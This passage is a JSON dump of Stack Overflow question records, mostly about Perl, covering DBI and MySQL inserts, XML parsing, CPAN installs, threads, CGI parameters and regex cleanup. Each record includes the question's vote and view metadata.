\");\n\nprint MAIL \"To: $to\\n\";\nprint MAIL \"From: $from\\n\";\nprint MAIL \"Subject: $subject\\n\\n\";\nprint MAIL \"Content-type: text/html\\n\\n\";\nopen(FILE, \"$file\") or die \"Cannot open $file: $!\";\nprint MAIL &lt;FILE&gt;;\nclose(FILE);\nclose(MAIL);\n</code></pre>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":12899044,"title":"XML::Simple: Parsing nested hashes/array","body":"<p>I am trying to parse an XML file. The Xml file can be found @ <a href=\"http://pastebin.com/fvuwbrh9\" rel=\"nofollow\">http://pastebin.com/fvuwbrh9</a>.\nI have saved this xml file as <code>packages.xml</code>.</p>\n\n<p><strong>Goal</strong>: List all the names which are surrounded by <code>&lt;packagereq&gt;</code> tag in the XML (I am referring the <code>packagereq</code> which fall under the <code>group</code> in the dumper output).</p>\n\n<p>I wrote below script called <code>rpm.pl</code>:</p>\n\n<pre><code>#!/usr/bin/perl -w\n\nuse strict;\nuse XML::Simple;\nuse Data::Dumper;\n\nmy $ref = XMLin ('packages.xml');\n#print Dumper ($ref);\n\nforeach my $a ( keys %{ $ref-&gt;{group} } )\n{\n    if ( exists $ref-&gt;{group}-&gt;{$a}-&gt;{packagelist} )\n    {\n        foreach my $b ( @{ $ref-&gt;{group}-&gt;{$a}-&gt;{packagelist}-&gt;{packagereq} } )\n        {\n            print $b-&gt;{content}.\"\\n\";  ### &lt;&lt;&lt; referring the Dumper out put\n        }   \n    }\n}\n</code></pre>\n\n<p>Now my script goes half way throgh and prints the package names but then it gets terminated with below error:</p>\n\n<pre><code>Not an ARRAY reference at rpm.pl line 29.\n</code></pre>\n\n<p>After above error, the script does not process rest of the XML file and terminates. </p>\n\n<p>Above error makes me believe that somewhere value of <code>$ref-&gt;{group}-&gt;{$a}-&gt;{packagelist}-&gt;{packagereq}</code> is not an ARRAY reference. </p>\n\n<p>I have gone as carefuly as I can throguh the XML file (OR the Dumper output) but found that <code>packagereq</code> always points to an ARRAY reference unless and of course I overlooked something but I doubt so.</p>\n\n<p>Could you provide some input on why is it complaining about <code>Not an ARRAY ref</code>.</p>\n\n<p>Thanks.</p>\n"},{"tags":["perl","multithreading"],"answer_count":3,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":724,"score":3,"question_id":2644238,"title":"Why am I getting a segmentation fault when I use binmode with threads in Perl?","body":"<p>this call</p>\n\n<pre><code>my $th = threads-&gt;create(\\&amp;print, \"Hello thread World!\\n\");\n$th-&gt;join();\n</code></pre>\n\n<p>works fine. But as soon as I add</p>\n\n<pre><code>binmode(STDOUT, \":encoding(ISO-8859-1)\");\n</code></pre>\n\n<p>to my script file, I get an error like \"segmentation fault\", \"access denied\".</p>\n\n<p>What is wrong to define an encoding type when trying to call a perl thread?</p>\n\n<p>Example:</p>\n\n<pre><code>use strict; use warnings;\nuse threads;\n\nbinmode(STDOUT, \":encoding(ISO-8859-1)\");\n\nmy $th = threads-&gt;create(\\&amp;print, \"Hello thread World!\\n\");\n$th-&gt;join();\n\nsub print {\n    print @_;\n}\n</code></pre>\n\n<p>This code does not work for me.</p>\n\n<p>Kind Regards</p>\n\n<p>--Andy </p>\n"},{"tags":["perl","line"],"answer_count":6,"favorite_count":1,"up_vote_count":11,"down_vote_count":0,"view_count":3865,"score":11,"question_id":3016734,"title":"Perl: How do I remove the first line of a file without reading and copying whole file","body":"<p>I do have a whole bunch of files in a directory and from every file I want to remove the first line (including carriage return). I can read the whole file into an array of strings and write all but the first element to a new file, but that looks a bit cumbersome to me are there better ways? Oh the prefered language is Perl.</p>\n"},{"tags":["perl","cpan","perl-module"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":58,"score":0,"question_id":12897007,"title":"Install GD Failure","body":"<p>I would like to install the modules required to run Circos. One of the required modules is <code>GD</code>. </p>\n\n<ul>\n<li>*OS: Mac OS X Version 10.7.4</li>\n<li>Installed libgd: <code>brew install libgd</code>*</li>\n</ul>\n\n<p>Following <code>cpan[1]&gt; install GD</code></p>\n\n<pre><code>Test Summary Report\n-------------------\nt/GD.t      (Wstat: 0 Tests: 12 Failed: 1)\n  Failed test:  10\nFiles=2, Tests=13,  0 wallclock secs ( 0.02 usr  0.00 sys +  0.11 cusr  0.02 csys =  0.15 CPU)\nResult: FAIL\nFailed 1/2 test programs. 1/13 subtests failed.\nmake: *** [test_dynamic] Error 255\n  LDS/GD-2.46.tar.gz\n  /usr/bin/make test -- NOT OK\n//hint// to see the cpan-testers results for installing this module, try:\n  reports LDS/GD-2.46.tar.gz\nRunning make install\n  make test had returned bad status, won't install without force\nFailed during this command:\n LDS/GD-2.46.tar.gz                           : make_test NO\n</code></pre>\n\n<p>Any ideas as to how to resolve this?</p>\n"},{"tags":["perl","operators"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":8,"view_count":96,"score":-8,"question_id":12892574,"title":"What is the use of this \"$x **= $n\" Operator","body":"<p>In Perl I know that we can use <code>\"$x *= $n\"</code> for multiplying <code>x</code> with <code>n</code>. So I mistakenly used <code>\"**=\"</code> and output seemed to be very high number for very small values of <code>\"n\"</code>. What does that operator do ?</p>\n\n<p>Please do not say that it is just for exponential. It is not. please verify using the syntax I have shown</p>\n"},{"tags":["mysql","perl","dbi"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":93,"score":1,"question_id":12896894,"title":"Perl DBI MySQL - unknown column in 'field list'","body":"<p>I've seen that this <code>unknown column in 'field list'</code> is a  frequently occurring problem and often has a simple solution. In my case the only thing I can think of is that some of my variables need quotes, but considering I'm pulling data from an array my initial reaction is that that is wrong. \nI'm experimenting with creating tables in Perl, hence results.</p>\n\n<p>I can create a table (<code>$table</code> is declared previously) fine using:</p>\n\n<pre><code>$dbh-&gt;do(\"create table if not exists $table ( id int(5) not null auto_increment, \n                                              time int(2) default null, \n                                              result_1 varchar(30), \n                                              result_2 varchar(30), \n                                              result_3 varchar(30), \n                                              rating int(2) default null, \n                                              primary key (id))\");\n</code></pre>\n\n<p>But when it comes to inserting my 'results':</p>\n\n<pre><code>my @results = ('abc','def','ghi');\nmy $r_1 = $results[0];\nmy $r_2 = $results[1];\nmy $r_3 = $results[2]; # (these results print out fine)\nmy $time = time;\nmy $insert = $dbh-&gt;prepare(\"insert into $table values(id,$time,$r_1,$r_2,$r_3,'')\");\n$insert-&gt;execute;\n</code></pre>\n\n<p>I get the error: </p>\n\n<p><code>DBD::mysql::st execute failed: Unknown column 'abc' in 'field list' at ...</code></p>\n\n<p>Should I need to add extra quotations when inserting the results from an array? Or is there another problem (probably simple!) that I haven't seen? </p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":62,"score":-2,"question_id":12888219,"title":"For/foreach loop crashing CGI server","body":"<p>I need to write some perl scripts for a class which include some for or foreach loops. For some reason even the simplest for loop are just returning a 500 server error. I've checked many times and the code also works on codepad.org, but I dont know why it is not working on the server.\nI dont have access to the server logs so I can't really tell whats going on.\nThese are some very simple loops that are also causing the error. </p>\n\n<pre><code>@a=(2,3,4);\n  foreach my $r (@a) { \n      print $r;\n  }\n</code></pre>\n\n<p>or</p>\n\n<pre><code> @a=(2,3,4);\n  for ($i = 0; $i &lt;= 2 ; $i++) {\n        print $a[$i];\n\n    }\n</code></pre>\n\n<p>Any ideas?</p>\n"},{"tags":["perl","http","cpan","lwp"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":84,"score":2,"question_id":12893432,"title":"While using LWP:UserAgent, $response->is_success returns blank","body":"<p>I am using <code>LWP::UserAgent</code> like below</p>\n\n<pre><code>my $ua = LWP::UserAgent-&gt;new;\n\nmy $response = $ua-&gt;request ( ...);\n\nif ( $response-&gt;is_success() )\n{\n...\n}\nprint $response-&gt;is_success();\n</code></pre>\n\n<p>Problem I am facing is that <code>is_success()</code> is returning blank. I was expecting <code>1</code> (TRUE) or <code>0</code> (FALSE). What am I doing wrong here? Is <code>print</code> statement right?</p>\n"},{"tags":["perl","bash","shell","awk"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":103,"score":0,"question_id":12885983,"title":"Grouping multiple values for same key from a text file to form single key-value pair","body":"<p>First, if there is a better title for this question, I am all ears!</p>\n\n<p>Is there a better way of doing this? </p>\n\n<p>I have a data file <code>input.txt</code> in this format:</p>\n\n<pre><code>field1=value1\nfield2=value2\nfield3=value3\n.\n.\n.\nfield1=value4\nfield2=value5\nfield3=value6\n</code></pre>\n\n<p>and so on ... and would like to end up with:</p>\n\n<pre><code>field1,value1 value4 ... valueM\nfield2,value2 value5 ... valueN\nfield3,value3 value6 ... valueO\n</code></pre>\n\n<p>What I've tried:</p>\n\n<ol>\n<li><p>Generate unique keys: <code>cat input.txt |awk -F\"=\" '{print $2}' |sort -u &gt; data_key</code></p></li>\n<li><p>Loop over rows in <code>data_key</code></p></li>\n</ol>\n\n<blockquote>\n<pre><code>#!/bin/bash\n\nfile=input.txt\nkeys=`cat data_key`\n\nfor value in $keys\ndo\n  output=`cat $file |grep $value |awk -F\"=\" '{print $2}' |tr -s '[:space:]' '[ *]' `\n  echo $value, $output\ndone\n</code></pre>\n</blockquote>\n"},{"tags":["perl","file","logging"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":12893148,"title":"Basics on &LogIt()","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/1347396/when-should-i-use-the-to-call-a-perl-subroutine\">When should I use the &amp; to call a Perl subroutine?</a>  </p>\n</blockquote>\n\n\n\n<p>I am new to Perl development and just going through sample code. </p>\n\n<p>I came across &amp;LogIt() where I have few basic questions to start with. I got info from Google like it logs error/msgs into the log file.</p>\n\n<pre><code>&amp;LogIt(\"Failed to create folder.\"); \n</code></pre>\n\n<p>In the above code, what does that '&amp;' represents? Is there any difference/ impact  between &amp;LogIt() and LogIt()? Would the msg \"Failed to create folder\" get printed somewhere? who ll use this msg? </p>\n\n<p>Kindly let me know some basics about &amp;LogIt(). </p>\n"},{"tags":["c","perl"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":133,"score":2,"question_id":12891319,"title":"How to store a paragraph in C source code?","body":"<p>I'm a perl programmer and surprised to find c language has no a convenient way to store a paragraph, like:</p>\n\n<pre><code>       my $a = &lt;&lt;'dd';\n          hello wolrd..\n           1\n            2\n             3\n       dd \n</code></pre>\n\n<p>So how do I the smiliary operation in C?</p>\n"},{"tags":["string","perl","join"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":82,"score":-1,"question_id":12891705,"title":"find a substring with character index","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/12889754/how-to-join-two-substrings-in-perl\">How to join two substrings in perl</a>  </p>\n</blockquote>\n\n\n\n<p>How could I find a substring of a string array which corresponds to user entered index of character? </p>\n\n<p>For example: If there is a string <code>$string = 'MFHYRAKCLAMSCTLPHCAKNDHGCTH';</code>and it get broken into array <code>@string = ( \"MFHYRA\",\"KCLAM\", \"SCTLP\", \"HCAKNDHGCTH\" ) ;</code> now if user enters position of <code>A</code> as 6 and 10, how could two corresponding substrings be searched and joined?</p>\n"},{"tags":["perl","dbi"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":40,"score":1,"question_id":12881182,"title":"Setting AutoCommit and begin_work/rollback are the same?","body":"<p>This question is about Perl DBI (I use it with MySQL).</p>\n\n<p>I want the following code:</p>\n\n<pre>{\n  local $dbh->{AutoCommit} = 0;\n  ...\n  if(...) {\n    $dbh->rollback;\n  }\n  ...\n}</pre>\n\n<p>Will it work as expected? (I mean no superfluous commit after rollback) Is $dbh->{AutoCommit} compatible with $dbh->begin_work and $dbh->rollback?</p>\n"},{"tags":["perl","parsing"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":66,"score":-2,"question_id":12889926,"title":"Retrieve the subroutine using the name","body":"<p>I have my input as follows:</p>\n\n<pre><code>       EX  R1,LABEL\n       MVA VAR1,VAR2\n LABEL LA  R1,VAR1\n</code></pre>\n\n<p>Here what I am trying to do is, split statement starting with \"EX\" and retrieve the argument \"LABEL\" and stored it in variable \"$lab\" .Then parse the code again and search for \"$lab\" at column1 and print \"LABEL LA R1,VAR1\" as my output.</p>\n\n<p>I have used split function and got my \"$lab = LABEL\" separated. but i am lost when i try to retrieve the line starting with \"$lab\".</p>\n\n<p>i used \"exists function\" .Is there any better solution that you people can help me?</p>\n"},{"tags":["perl","join"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":71,"score":0,"question_id":12889754,"title":"How to join two substrings in perl","body":"<p>How to join only those substrings of a string array which contain a character whose positions were entered by user through command line? </p>\n\n<p>For example: if <code>$string</code> is <code>\"MALWCMRALPLCLALALCAWGPDPACAFVN\"</code> and <code>@array</code> contains substrings of every cut at <code>'A'</code> in <code>$string</code>. Then how could two substrings which contains <code>'L'</code> at positions 3 and 9 (entered by user through command line) in the original string be joined?</p>\n"},{"tags":["perl","cpan"],"answer_count":1,"favorite_count":1,"up_vote_count":6,"down_vote_count":0,"view_count":90,"score":6,"question_id":12888941,"title":"CPAN thinks an outdated module is up to date","body":"<pre><code>$ sudo cpanm Heap::Priority\nHeap::Priority is up to date. (0.01)\n</code></pre>\n\n<p>The current version is 0.11. I'm new to CPAN so I'm getting really frustrated. What's wrong and how do I fix it? Thanks.</p>\n"},{"tags":["perl"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":130,"score":3,"question_id":12878941,"title":"Perl: Frequency of words and a top ten list of the words","body":"<p>Im working on making a perl script work, and beware I'm rather new to this.. </p>\n\n<p>Here's is what im trying to achieve: making a script that takes a .txt file and counts each word in the file. And when it's counted the words makes a list if the top 10 words in the file displaying how many times each word i counted.</p>\n\n<p>well here's what ive got so far, ive been able to make the script count the words and how many times they appear. Now i need to make the top ten list and I don't really know where and how to do it. This is a homework assignment so I don't want/expect you to solve it for me, just give me some pointers in where to begin.</p>\n\n<p>Thank you for helping (in advance)</p>\n\n<hr>\n\n<p>Updated 15 oct</p>\n\n<p>ok, it's sorting everything great but..</p>\n\n<p>As it is now it's just printing everything in one line. I need it to print it like this: <br><br>\n4 word<br>\n3 next word<br>\n2 next word<br><br></p>\n\n<p>Well you get it..</p>\n\n<hr>\n\n<p>I think i've got it...i think :P</p>\n\n<p><br>\n......................................</p>\n\n<pre><code>#! /usr/bin/perl\n\nuse utf8;\n\n\nprint (\"Vilken fil?\\n\");\nmy $filen = @ARGV ? shift(@ARGV) : &lt;STDIN&gt;;\nchomp $filen;\n\nmy %freq;\n\nopen my $DATA, $filen or die \"Hittade inte den filen!\";\n\n\nwhile(&lt;$DATA&gt;) {\n\n    s/[;:()\".,!?]/ /gio;    \n    foreach $word(split(' ', lc $_)) {  \n    $freq{$word}++;                  \n     }\n}\n\n@listing = (sort { $freq{$b} &lt;=&gt; $freq{$a} } keys %freq)[0..9];\nforeach my $word (@listing )\n    { print $freq{$word}.\" $word\\n\"; };\n</code></pre>\n"},{"tags":["perl","dancer"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":12887070,"title":"Accessing Authorization Header","body":"<p>How do I access the Authorization header of a request with Perl Dancer?</p>\n\n<p>I have tested my client and it is successfully passing the <code>Authorization</code> header, but it does not appear in the <code>request-&gt;headers</code> hash. I can get it to show up by simply misspelling it or appending an <code>X-</code> in front but I'm making an API and would like to use the conventional header to pass the request signature for authentication.</p>\n"},{"tags":["mysql","string","perl","dbi"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":12887371,"title":"Inserting a string in MYSQL through Perl","body":"<p>The problem I am having is that I have a user input a string... Could be anything less than 156 characters, and the DBI statement inserts the string perfectly if there are no apostrophes or quotation marks in the string. </p>\n\n<p>This works fine-> I am working!\nThis doesn't work-> I'm not working!</p>\n\n<p>To insert I use the following code:</p>\n\n<pre><code>    $sth = $dbh-&gt;prepare(\"INSERT INTO table VALUES('$var1','$var2','$var3')\");\n    $sth-&gt;execute();\n</code></pre>\n\n<p>I know that Perl interpolates the strings different with ' ' and \" \" but my program throws a fit when I try that. I've also tried using a join to join that prepare statement together using \" \" marks. The variable that stores the 155 characters is $var3 if that matters, and all 3 are VARCHAR attributes. Any suggestions?</p>\n"},{"tags":["windows","perl","file-io","perl5"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":85,"score":0,"question_id":12886217,"title":"How to get file last modified time with Perl 5.004 and no modules","body":"<p>I have a standalone version of perl for Windows (5.004) that does not include any modules.  I want to run a script to check the last modified time of several files.</p>\n\n<p>I could use <code>File::stat</code> but that module doesn't exist (the copy of perl is in version control, so it can be used by people who do not have ActivePerl or Strawberry Perl installed).</p>\n\n<p>It seems like there are three options:</p>\n\n<ol>\n<li>Figure out how to put a newer, more functional, standalone perl installation into version control</li>\n<li>Just add the File::Stat module somehow, and do <code>use lib</code> (does that work on 5.004?)</li>\n<li>Use some built-in functions included in 5.004 for Windows to get the file status.</li>\n</ol>\n\n<p>Ideas?</p>\n"},{"tags":["sql","perl","spreadsheet"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":157,"score":0,"question_id":12740549,"title":"SQL Database to Perl Spreadsheet","body":"<p>I have a 'transaction' table created in SQL like this:</p>\n\n<pre><code>TranID  Date        AccNum   Type    Amount ChequeNo DDNo  \n657520  02-07-1999  0181432  Debit   16000  465774     \n657524  02-07-1999  0181432  Debit   13000           569086\n657538  09-07-1999  0181432  Credit  11000  \n657548  18-07-1999  0181432  Credit  15500  \n657519  02-07-1999  0181432  Debit   12000  \n657523  02-07-1999  0181432  Credit  11000  \n657529  03-07-1999  0181433  Debit   15000  466777\n657539  10-07-1999  0181433  Credit  10000  \n657541  11-07-1999  0181433  Debit   12000  \n657525  03-07-1999  0181433  Debit   15000           569999\n657533  05-07-1999  0181433  Credit  12500  \n</code></pre>\n\n<p>The question is: Query data from transaction table and calculate total amount debited by cheque, dd and by cash for each account and store the result in a spreadsheet. My script is like this:</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\nuse warnings;\nuse DBI; \nuse Spreadsheet::WriteExcel;\nmy $dbh = DBI-&gt;connect('dbi:mysql:database:3306','prithvi','prithvi') or die $dbh-&gt;errstr;\nmy $sth = $dbh-&gt;prepare(\"SELECT `AccNum`,`Type`,`Amount`,`ChequeNo`,`DDNo` FROM `transaction`\");\n$sth-&gt;execute or die $sth-&gt;errstr;\nmy $workbook = Spreadsheet::WriteExcel-&gt;new('query_result.xls');\nmy $worksheet = $workbook-&gt;add_worksheet();\nmy $row = 0;\nmy $col = 0;\nmy %h;\n$worksheet-&gt;write_row($row++,$col,['Account Number','Cheque Debit','DD Debit','Cash Debit']);\nwhile(my @data = $sth-&gt;fetchrow_array)\n{\n next unless($data[1] eq 'Debit');\n my $result = $data[3] ? \"ChequeNo\" : $data[4] ? \"DDNo\" : \"Cash\";\n $h{$data[0]}{$result} += $data[2];\n $worksheet-&gt;write_row($row++,$col,\\@data);\n}\n$sth-&gt;finish;\n$dbh-&gt;disconnect;\n</code></pre>\n\n<p>I am not getting the proper output. Where am I going wrong? Please help. Thanks in advance.\nI have not got the answer for this question i.e., mainly storing the result in a spreadsheet. Please do not close this before answering. This is a very kind request to all of you.</p>\n"},{"tags":["perl"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":94,"score":2,"question_id":11036066,"title":"Code in main vs subroutine","body":"<p>how do you decide whether to put code in a subroutine or in main portion of a Perl script?</p>\n\n<p>I understand if you need to re-use code you would put it in subroutine, but what if you're not reusing? Is it good practice to put in subroutines to group code and make it easier to read?</p>\n\n<p><strong>Example (in main):</strong></p>\n\n<pre><code>my ($num_one, $num_two) = 1, 2;\nprint $num_one + $num_two;\nprint $num_one - $num_two;\n</code></pre>\n\n<p><strong>Example (in subroutines):</strong> </p>\n\n<pre><code> my ($num_one, $num_two) = 1, 2;\n add($num_one, $num_two);\n subtract($num_one, $num_two);\n\n sub add {\n     my ($num_one, $num_two) = @_;\n     return $num_one + $num_two;\n }\n\n sub subtract {\n     my ($num_one, $num_two) = @_;\n     return $num_one - $num_two;\n }    \n</code></pre>\n\n<p>I know this is a simple example, but for more complex code (if sub add and sub subtract had more code), would it make sense to group in subroutines?</p>\n\n<p>Thanks!</p>\n"},{"tags":["perl"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":47,"score":-1,"question_id":12883248,"title":"update on mysql fails with following error - perl","body":"<p>The script uses perl and mysql. While attempting to update the mysql database, I m getting the following error. Not sure why this is being caused. Any ideas?</p>\n\n<p>DBD::mysql::db do failed: FUNCTION hello.ARRAY does not exist at /Perl/connection.pm .</p>\n"},{"tags":["perl","unicode"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":294,"score":1,"question_id":3724720,"title":"Excel with Japanese (wide) fonts","body":"<p>I was working on parsing an Excel file that has Japanese in some of the cells. By using <em>Spreadsheet::ParseExcel (Ver. 0.15)</em> (which I know is older than current version), some of the cells with the characters below:</p>\n\n<blockquote>\n  <p>ï¼è¨­å®B-ï¼ã³ã¼ã¹ï¼</p>\n</blockquote>\n\n<p>are appearing as:</p>\n\n<blockquote>\n  <p>print Dumper $oWkc->{_Value};</p>\n  \n  <p>$VAR1 = \"\\x{ff1c}\\x{8a2d}\\x{5b9a}B-\\x{ff11}\\x{30b3}\\x{30fc}\\x{30b9}\\x{ff1e}\";</p>\n</blockquote>\n\n<p>and</p>\n\n<blockquote>\n  <p>print $oWkc->{Val} . \"\\n\";</p>\n  \n  <p>[-0</p>\n  \n  <p>$VAR1 = \"\\x{ff1c}\\x{8a2d}\\x{5b9a}B-\\x{ff13}\\x{30b3}\\x{30fc}\\x{30b9}\\x{ff1e}\";</p>\n  \n  <p>[-0</p>\n</blockquote>\n\n<p>If I want to get these values printed in the actual foramat, I am setting the STDOUT File handle to \"<em>:utf8</em>\", and my terminal to display utf-8 encoding (otherwise I am getting some \"wide character\" warning). Here I have to pick cells with B-ï¼ or B-2 , but I am not sure what should be set inside my script so that these characters can be treated as what I am able to see them on STDOUT.</p>\n\n<p>Currently I am using a regular expression to convert these wide characters to their corresponding ASCII value. As an example if I want to match B-1 which is stored as 'B-\\x{ff11}', I will be</p>\n\n<pre><code>$oWkc-&gt;{_Value} =~ /([AB]-)(\\x{ff11}|\\x{ff12}|\\x{ff13}/\nmy $lookup = $1.$2;\n$lookup =~ s/\\x{ff11}/1/;\n$lookup =~ s/\\x{ff12}/2/;\n$lookup =~ s/\\x{ff13}/3/;\n</code></pre>\n\n<p>For reference, B-1, A-2 etc these values are coming from some other source, and currently are ranging from A|B-[1-3].</p>\n\n<p>What is the standard way to deal with these wide characters? I am not able to use encode/decode etc. Can any one give me some direction?</p>\n\n<p>Currently though I am able to get the work done using regex...</p>\n"},{"tags":["perl","application","cgi","catalyst"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":3,"view_count":75,"score":-2,"question_id":12882280,"title":"Which one: Catalyst or CGI::Application?","body":"<p>SO Hivemind,</p>\n\n<p>I am looking at building a new web application using Perl (for this project, Perl is the requirement).  I really enjoyed using Java Spring MVC and want to bring the best elements of that to this new application.</p>\n\n<p>I have used CGI::Application several times and really like its simplicity and flexibility.  However, it looks like Catalyst along with Moose (the aftermarket Object system overlay) has the juice in the community.</p>\n\n<p>There will be fewer than 5 developers on this project.  Is the Catalyst learning curve worth the climb?</p>\n"},{"tags":["perl","dbi"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":65,"score":3,"question_id":12881224,"title":"Detecting deadlocks with DBI","body":"<p>What is the proper way to detect a deadlock with Perl DBI?</p>\n\n<p>Should I use <code>eval { }</code>? Which exception to catch?</p>\n"},{"tags":["python","ruby","perl","bash","shell"],"answer_count":12,"favorite_count":80,"up_vote_count":181,"down_vote_count":2,"view_count":45618,"score":179,"question_id":3637668,"title":"Why are scripting languages (e.g. Perl, Python, Ruby) not suitable as shell languages?","body":"<p>What are the differences between shell languages like <a href=\"http://www.gnu.org/software/bash/bash.html\" rel=\"nofollow\" rel=\"nofollow\" rel=\"nofollow\" rel=\"nofollow\" rel=\"nofollow\">bash</a>, <a href=\"http://zsh.sourceforge.net/\" rel=\"nofollow\" rel=\"nofollow\" rel=\"nofollow\" rel=\"nofollow\" rel=\"nofollow\">zsh</a>, <a href=\"http://fishshell.com/screenshots.html\" rel=\"nofollow\" rel=\"nofollow\" rel=\"nofollow\" rel=\"nofollow\" rel=\"nofollow\">fish</a> and the scripting languages above that makes them more suitable for the shell?</p>\n\n<p>When using the command line the shell languages seem to be much easier. It feels for me much smoother to use bash for example than to use the shell profile in ipython, <a href=\"http://transneptune.net/2009/06/16/ipython-as-your-default-shell/\" rel=\"nofollow\" rel=\"nofollow\" rel=\"nofollow\" rel=\"nofollow\" rel=\"nofollow\">despite reports to the contrary</a>. I think most wil agree with me that a large portion of medium to large scale programming is easier in Python than in bash. I use Python as the language I am most familiar with, the same goes for Perl and Ruby.</p>\n\n<p>I have tried to articulate the reason but am unable to, aside from assuming that the treatment of strings differently in both has something to do with it.</p>\n\n<p>The reason of this question is that I am hoping to develop a language usable in both. If you know of such a language, please post it as well.</p>\n\n<p>As S.Lott explains, the question needs some clarification. I am asking about the features of the shell <em>language</em> versus that of scripting languages. So the comparison is not about the characteristics of various interactive (<a href=\"http://en.wikipedia.org/wiki/Read%E2%80%93eval%E2%80%93print_loop\" rel=\"nofollow\" rel=\"nofollow\" rel=\"nofollow\" rel=\"nofollow\" rel=\"nofollow\">REPL</a>) environments such as history and command line substitution. An alternative expression for the question would be:</p>\n\n<p>Can a programming language that is suitable for design of complex systems be at the same time able to express useful one-liners that can access the file system or control jobs? Can a programming language usefully scale up as well as scale down?</p>\n"},{"tags":["perl","cgi"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":84,"score":0,"question_id":12866826,"title":"Strange behavior when passing parameters to a Perl/CGI script, from another Perl/CGI script","body":"<p>For a project at work, I need to call one Perl/CGI script from another. An extremely simplified version of that script that I'm using for testing is here (the real scripts don't use recursion, but this way I don't have to copy &amp; paste a lot of code):</p>\n\n<pre><code>#!/usr/local/bin/perl\nuse CGI qw(:standard);\nuse POSIX 'setsid';\n$|=1;\n\nprint \"Content-type: text/html\\n\\n\";\n\n@names = param;\nprint \"@names\";\n\nif(defined(param('submit'))){\n        #delete_all();\n        system('perl testParams.pl abc=123');\n        exit(0);\n} else{\n        print \"NO SUBMIT PARAM\";\n}\n</code></pre>\n\n<p>What this script is supposed to do:</p>\n\n<ol>\n<li>Print names of all parameters.</li>\n<li>If a submit parameter is defined, run the script again but with a parameter called \"abc\".</li>\n<li>If a \"submit\" parameter is not defined, print \"NO SUBMIT PARAM\".</li>\n</ol>\n\n<p>What the script actually does:</p>\n\n<ol>\n<li>Print names of all parameters.</li>\n<li>If a \"submit\" parameter is defined, run the script again with the same parameters that the original script was run with.</li>\n<li>If a \"submit\" parameter is not defined, print \"NO SUBMIT PARAM\".</li>\n</ol>\n\n<p>Any idea what's causing Perl/CGI to ignore the new parameters and instead send the old ones when running the script?</p>\n"},{"tags":["perl","dbi"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":98,"score":1,"question_id":12871496,"title":"DBI: selectall_arrayref and columnnames","body":"<p>When I fetch the data this way is it possible then to access the column names and the column types or do I need an explicit <code>prepare</code> to reach this?</p>\n\n<pre><code>use DBI;\n\nmy $dbh = DBI-&gt;connect( ... ); \nmy $select = \"...\";\nmy @arguments = ( ... );\n\nmy $ref = $dbh-&gt;selectall_arrayref( $select, {}, @arguments, );\n</code></pre>\n\n<p>Update:</p>\n\n<p>With <code>prepare</code> I would do it this way:</p>\n\n<pre><code>my $sth = $dbh-&gt;prepare( $select );\n$sth-&gt;execute( @arguments );\nmy $col_names = $sth-&gt;{NAME};\nmy $col_types = $sth-&gt;{TYPE};\nmy $ref = $sth-&gt;fetchall_arrayref;\nunshift @$ref, $col_names;\n</code></pre>\n"},{"tags":["regex","perl"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":105,"score":3,"question_id":12877046,"title":"Removing repeated characters, including spaces, in one line","body":"<p><br>\nI currently have a string, say <code>$line='55.25040882,     3,,,,,,'</code>, that I want to remove all whitespace and repeated commas and periods from. Currently, I have:</p>\n\n<pre><code>    $line =~ s/[.,]{2,}//;\n    $line =~ s/\\s{1,}//;\n</code></pre>\n\n<p>Which works, as I get <code>'55.25040882,3'</code>, but when I try</p>\n\n<pre><code>$line =~ s/[.,\\s]{2,}//;\n</code></pre>\n\n<p>It pulls out the \",     \" and leaves the \",,,,,,\". I want to retain the first comma and just get rid of the whitespace. <br>\nIs there a way to elegantly do this with one line of regex? Please let me know if I need to provide additional information.</p>\n\n<p>EDIT: Since there were so many solutions, I decided to update my question with the answer below:<br></p>\n\n<pre><code>$line =~ s/([.,])\\1{1,}| |\\t//g;\n</code></pre>\n\n<p>This removes all repeated periods and commas, removes all spaces and tabs, while retaining the \\r and \\n characters. There are so many ways to do this, but this is the one I settled for. Thanks so 